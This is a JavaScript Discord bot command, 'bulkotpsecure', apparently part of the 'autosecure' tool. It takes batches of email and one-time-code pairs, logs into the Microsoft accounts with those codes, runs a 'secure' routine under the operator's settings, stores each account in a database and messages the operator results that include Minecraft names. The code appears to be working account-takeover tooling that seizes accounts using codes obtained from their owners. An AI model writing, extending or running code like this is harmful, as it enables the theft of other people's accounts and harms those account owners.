const login = require('../../../autosecure/utils/secure/login');
const secure = require('../../../autosecure/utils/secure/recodesecure');
const listAccount = require('../../../autosecure/utils/accounts/listAccount');
const { queryParams } = require('../../../db/database');
const generateuid = require('../../../autosecure/utils/generateuid');
const insertaccount = require('../../../db/insertaccount');
const getCredentials = require('../../../autosecure/utils/info/getCredentials');
const { failedembed } = require('../../../autosecure/utils/embeds/embedhandler');
const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const MAX_BULK = 10;

module.exports = {
    name: "bulkotpsecure",
    userOnly: true,
    callback: async (client, interaction) => {
        try {
            await interaction.deferReply({ ephemeral: true });

            const settingsData = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [interaction.user.id]);
            if (settingsData.length === 0) {
                return interaction.editReply({ content: `Couldn't get your settings! Run /secure config first.` });
            }
            const settings = settingsData[0];

            const accountsRaw = interaction.fields.getTextInputValue('accounts');
            const mcnamesRaw = interaction.fields.getTextInputValue('mcnames') || '';

            const accountLines = accountsRaw.trim().split('\n').map(l => l.trim()).filter(Boolean);
            const mcnameLines = mcnamesRaw.trim() ? mcnamesRaw.trim().split('\n').map(l => l.trim()).filter(Boolean) : [];

            if (accountLines.length === 0) {
                return interaction.editReply('Please provide at least one account.');
            }
            if (accountLines.length > MAX_BULK) {
                return interaction.editReply(`Too many accounts! Please provide at most **${MAX_BULK}** at a time.`);
            }

            await interaction.editReply({
                embeds: [{
                    title: `⏳ Bulk OTP Securing ${accountLines.length} account(s)...`,
                    description: `Results will be sent to you via DM as each one completes.\nPlease keep your DMs open.`,
                    color: 0xb2c7e0
                }]
            });

            const securePromises = accountLines.map(async (line, i) => {
                const parts = line.split(':');
                if (parts.length < 2) {
                    return interaction.user.send({
                        embeds: [{
                            title: `❌ Invalid Format`,
                            description: `**Line ${i + 1}:** \`${line}\`\nExpected format: \`email:otp\``,
                            color: 0xff4444
                        }]
                    }).catch(() => {});
                }

                const [email, otp] = parts;
                const mcign = mcnameLines[i] || null;

                if (isNaN(otp) || otp.length < 6 || otp.length > 7) {
                    return interaction.user.send({
                        embeds: [{
                            title: `❌ Invalid OTP`,
                            description: `Email: \`${email}\`\nOTP \`${otp}\` is invalid — must be a 6-7 digit number.`,
                            color: 0xff4444
                        }]
                    }).catch(() => {});
                }

                try {
                    console.log(`[BULK_OTP] Securing ${email} OTP: ${otp} MC: ${mcign || 'none'}`);

                    let profiles;
                    try {
                        profiles = await getCredentials(email, false);
                    } catch {
                        return interaction.user.send({
                            embeds: [{ title: `❌ Lookup Failed`, description: `Email: \`${email}\`\nCouldn't look up account credentials.`, color: 0xff4444 }]
                        }).catch(() => {});
                    }

                    if (!profiles?.Credentials?.OtcLoginEligibleProofs?.length) {
                        return interaction.user.send({
                            embeds: [{ title: `❌ No OTP Proofs`, description: `Email: \`${email}\`\nNo OTP login options found for this account.`, color: 0xff4444 }]
                        }).catch(() => {});
                    }

                    const uid = await generateuid();

                    let loggedIn = false;
                    for (const proof of profiles.Credentials.OtcLoginEligibleProofs) {
                        const host = await login({ email, id: proof.data, code: otp }, profiles);
                        if (!host) continue;

                        loggedIn = true;
                        console.log(`[BULK_OTP] Login success for ${email}`);

                        const acc = await secure(host, settings, uid, mcign);
                        await insertaccount(acc, uid, interaction.user.id, settings.secureifnomc);

                        const failMsg = await failedembed(acc, uid);
                        if (failMsg.failed) {
                            await interaction.user.send(failMsg.failedmsg).catch(() => {});
                            return;
                        }

                        const accMsg = await listAccount(acc, uid, client, interaction);

                        await interaction.user.send({
                            embeds: [{
                                title: `✅ Secured: ${email}`,
                                description: `Minecraft: **${acc.newName || 'None'}**`,
                                color: 0x57f287
                            }]
                        }).catch(() => {});
                        await interaction.user.send(accMsg).catch(() => {});
                        return;
                    }

                    if (!loggedIn) {
                        await interaction.user.send({
                            embeds: [{ title: `❌ OTP Failed`, description: `Email: \`${email}\`\nCouldn't login with the provided OTP code.`, color: 0xff4444 }]
                        }).catch(() => {});
                    }

                } catch (err) {
                    console.error(`[BULK_OTP] Error processing ${email}:`, err);
                    await interaction.user.send({
                        embeds: [{ title: `❌ Error`, description: `Email: \`${email}\`\nAn unexpected error occurred.`, color: 0xff4444 }]
                    }).catch(() => {});
                }
            });

            await Promise.all(securePromises);

            await interaction.editReply({
                embeds: [{
                    title: `✅ Bulk OTP Complete`,
                    description: `Processed **${accountLines.length}** account(s). Check your DMs for individual results.`,
                    color: 0x57f287
                }]
            });

        } catch (error) {
            console.error('[BULK_OTP] Fatal error:', error);
            try {
                if (interaction.deferred || interaction.replied) {
                    await interaction.editReply('An unexpected error occurred. Please try again.');
                } else {
                    await interaction.reply({ content: 'An unexpected error occurred.', ephemeral: true });
                }
            } catch (_) {}
        }
    }
};
